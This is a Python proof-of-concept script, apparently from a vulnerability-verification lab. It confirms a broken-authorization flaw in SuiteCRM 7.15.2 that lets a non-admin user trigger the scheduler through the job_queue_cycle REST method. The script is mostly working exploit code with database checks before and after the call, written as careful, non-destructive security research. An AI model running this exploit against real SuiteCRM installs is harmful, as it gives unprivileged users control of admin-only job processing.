#!/usr/bin/env python3
"""
VULN-080 -- Web-service `job_queue_next/cycle/run`: any authenticated user drives the
            scheduler/job queue (broken function-level authorization).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/v4/SugarWebServiceImplv4.php:719-730 (job_queue_cycle -> $queue->
             cleanup(); $queue->runSchedulers();) -- gated only by checkSessionAndModuleAccess
             with an EMPTY module argument (session-only, no is_admin check).

Plan (single, non-destructive call -- per stage-10 rules, do NOT loop/spam the scheduler)
----
1. Snapshot the live `schedulers` and `job_queue` tables as admin/db (read-only) BEFORE
   touching anything. This lab already has several Active schedulers with job_interval
   '*::*::*::*::*' (due every minute) and last_run=NULL (cron.php has never run in this
   container -- confirmed CLI-only per stage-01), and an empty job_queue table -- an ideal,
   already-existing baseline; nothing is created or modified to set this up.
2. Control: call job_queue_cycle with an INVALID/garbage session id -> must be denied
   (invalid_session), proving the method really does check *something*.
3. The actual bug: an ordinary low-privilege user (freshly created, no admin flag, no
   special Role) calls job_queue_cycle EXACTLY ONCE with their own valid session.
4. Prove it executed (not merely returned a canned "ok"): re-read `schedulers.last_run`
   for the due schedulers and `job_queue` -- SugarJobQueue::runSchedulers() advances
   last_run / enqueues jobs for due schedulers as an observable, real side effect.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, rest_call)
from _c1_common import db_rows

VULN_ID = "VULN-080"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "job_queue_cycle reachable+executable by any authenticated user (single call)")

    log("SETUP", "admin web session (for user provisioning only -- NOT used to call job_queue_*)")
    admin_s = admin_session()

    log("SETUP", "create ONE ordinary low-privilege user -- no admin flag, no special Role")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    from _common import rest_login
    low_sid = rest_login(low["user_name"], low["password"])
    log("OK", f"low-priv user {low['user_name']} id={low['id']} is_admin=0")

    log("SETUP", "idempotency: SugarJobQueue::runSchedulers() will not re-queue a scheduler that "
                 "already has a pending 'queued' job_queue entry (sane dedup behaviour) -- so a stale "
                 "'queued' row left by an EARLIER run of this same script would mask the effect on a "
                 "re-run. Clear only 'queued' (never-executed) rows for the due schedulers this test "
                 "watches -- these are transient work-queue entries, not user data, and nothing in this "
                 "lab consumes them (cron.php is CLI-only), so they are inert leftovers of this exploit.")
    due_ids = [s["id"] for s in db_rows("SELECT id FROM schedulers WHERE deleted=0 AND status='Active' "
                                         "AND job_interval='*::*::*::*::*';")]
    if due_ids:
        db_rows(f"DELETE FROM job_queue WHERE status='queued' AND scheduler_id IN "
                f"({','.join(chr(39)+i+chr(39) for i in due_ids)});")

    log("STEP", "snapshot schedulers + job_queue BEFORE (read-only, pre-existing lab state)")
    before_sched = db_rows("SELECT id, name, job_interval, last_run FROM schedulers "
                            "WHERE deleted=0 AND status='Active' ORDER BY name;")
    before_queue_count = db_rows("SELECT COUNT(*) c FROM job_queue;")[0]["c"]
    before_queue_ids = {r["id"] for r in db_rows("SELECT id FROM job_queue;")}
    due_before = [s for s in before_sched if s["job_interval"] == "*::*::*::*::*"]
    log("INFO", f"{len(before_sched)} Active schedulers, {len(due_before)} due-every-minute "
                f"('*::*::*::*::*'), job_queue row count={before_queue_count}")
    for s in due_before:
        log("INFO", f"  DUE scheduler: {s['name']!r} last_run={s['last_run']!r}")
    with open(os.path.join(HERE, "evidence", "schedulers_before.json"), "w") as f:
        json.dump({"schedulers": before_sched, "job_queue_count": before_queue_count}, f, indent=2)

    log("STEP", "control: job_queue_cycle with an INVALID session id -- must be denied")
    control = rest_call("job_queue_cycle", ["not-a-real-session-id", rand("ctrl")])
    log("INFO", f"control (invalid session) response: {control}")
    control_denied = "session" in json.dumps(control).lower() and (
        "invalid" in json.dumps(control).lower() or control.get("number") == 11)
    log("PROOF" if control_denied else "FAIL", f"control: invalid session correctly denied = {control_denied}")

    clientid = rand("lowpriv_client")
    log("STEP", f"THE CALL (exactly once): low-priv job_queue_cycle(session, clientid={clientid!r})")
    resp = rest_call("job_queue_cycle", [low_sid, clientid])
    log("INFO", f"low-priv job_queue_cycle response: {resp}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f'method=job_queue_cycle&input_type=JSON&response_type=JSON&rest_data='
            f'["{low_sid}","{clientid}"]\n'
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(resp, indent=2))
    with open(os.path.join(HERE, "evidence", "job_queue_cycle_response.json"), "w") as f:
        json.dump(resp, f, indent=2)

    api_said_ok = resp.get("results") == "ok"

    log("STEP", "snapshot schedulers + job_queue AFTER the single low-priv call")
    after_sched = db_rows("SELECT id, name, job_interval, last_run FROM schedulers "
                           "WHERE deleted=0 AND status='Active' ORDER BY name;")
    after_queue_count = db_rows("SELECT COUNT(*) c FROM job_queue;")[0]["c"]
    after_by_id = {s["id"]: s for s in after_sched}
    with open(os.path.join(HERE, "evidence", "schedulers_after.json"), "w") as f:
        json.dump({"schedulers": after_sched, "job_queue_count": after_queue_count}, f, indent=2)

    advanced = []
    for s in due_before:
        a = after_by_id.get(s["id"])
        if a and a["last_run"] != s["last_run"] and a["last_run"] is not None:
            advanced.append((s["name"], s["last_run"], a["last_run"]))

    after_queue_ids = {r["id"] for r in db_rows("SELECT id FROM job_queue;")}
    new_queue_rows = db_rows(
        "SELECT id, scheduler_id, target, status, execute_time FROM job_queue WHERE id IN ({});".format(
            ",".join(f"'{i}'" for i in (after_queue_ids - before_queue_ids)) or "''"
        )
    ) if (after_queue_ids - before_queue_ids) else []

    log("INFO", f"job_queue row count: before={before_queue_count} after={after_queue_count}; "
                f"NEW row ids (not present before this call)={len(after_queue_ids - before_queue_ids)}")
    for row in new_queue_rows:
        log("PROOF", f"NEW job_queue row: id={row['id']} scheduler_id={row['scheduler_id']} "
                     f"target={row['target']!r} status={row['status']!r}")
    for name, old, new in advanced:
        log("PROOF", f"scheduler {name!r} last_run advanced: {old!r} -> {new!r}")

    with open(os.path.join(HERE, "evidence", "new_job_queue_rows.json"), "w") as f:
        json.dump(new_queue_rows, f, indent=2)

    real_execution = bool(advanced) or bool(new_queue_rows)
    log("PROOF", f"job_queue_cycle produced a REAL, independently-observable side effect "
                 f"(new job_queue rows and/or scheduler last_run advanced) = {real_execution}")

    ok = control_denied and api_said_ok and real_execution
    if not ok:
        reasons = []
        if not control_denied:
            reasons.append("control call with invalid session was not denied (test setup problem)")
        if not api_said_ok:
            reasons.append(f"API did not report results=ok: {resp}")
        if not real_execution:
            reasons.append("no observable DB side effect (last_run/job_queue unchanged) -- "
                            "cannot rule out this being a no-op / permission-error-shaped success")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "Confirmed: an ordinary, non-admin authenticated user reached job_queue_cycle and it "
              "REALLY executed the scheduler/job-queue machinery (observable DB side effect), not a "
              "permission error. Called exactly once, as instructed -- no loop/spam.")
    verdict(VULN_ID, "CONFIRMED",
            f"low-priv user (is_admin=0) called job_queue_cycle once; results='ok'; real side effect: "
            f"{len(advanced)} due scheduler(s) advanced last_run and/or job_queue count "
            f"{before_queue_count}->{after_queue_count}")
    sys.exit(0)


if __name__ == "__main__":
    main()
